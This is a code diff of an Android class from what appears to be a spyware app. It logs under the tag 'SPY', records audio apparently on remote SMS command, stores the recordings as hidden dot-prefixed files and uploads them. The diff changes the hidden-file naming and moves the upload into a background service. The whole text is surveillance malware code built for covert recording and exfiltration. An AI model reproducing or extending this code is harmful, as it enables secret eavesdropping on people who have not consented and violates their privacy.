@@ -67,7 +67,6 @@ public class RecorderHelpers extends ContextWrapper implements
             Log.i("SPY", "Recording already in progress");
             return;
         }
-
         if (!isAvailableSpacePercentageAbove(10)) {
             if (Helpers.originatingAddress != null) {
                 Helpers.sendDataSmsResponse(
@@ -79,7 +78,7 @@ public class RecorderHelpers extends ContextWrapper implements
             stopService(new Intent(getApplicationContext(), DetectorService.class));
             return;
         }
-        String path = AppGlobals.getAppDataDirectory() + getTimeStamp() + ".aac";
+        String path = AppGlobals.getAppDataDirectory()+"."+getTimeStamp() + ".aac";
         sRecorder = CustomMediaRecorder.getInstance();
         sRecorder.reset();
         sRecorder.setOnNewFileWrittenListener(this);
@@ -164,17 +163,17 @@ public class RecorderHelpers extends ContextWrapper implements
         SimpleDateFormat simpleDateFormat =
                 new SimpleDateFormat("yyyyMMddHHmmss", Locale.UK);
         simpleDateFormat.setTimeZone(timeZone);
-        return "." + simpleDateFormat.format(calendar.getTime());
+        return  simpleDateFormat.format(calendar.getTime());
     }
 
     @Override
     public void onNewRecordingCompleted(String path) {
-        CheckInternetAndUpload checkInternet = new CheckInternetAndUpload(getApplicationContext());
         UploadRecordingTaskHelpers uploadRecordingTaskHelpers
                 = new UploadRecordingTaskHelpers(getApplicationContext());
         if (uploadRecordingTaskHelpers.isNetworkAvailable()) {
-            checkInternet.setCurrentUplaodFile(path);
-            new Thread(checkInternet).start();
+            Intent intent = new Intent(this, UploadRecordingTask.class);
+            intent.putExtra("path", path);
+            startService(intent);
         } else {
             RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
                     (getApplicationContext());
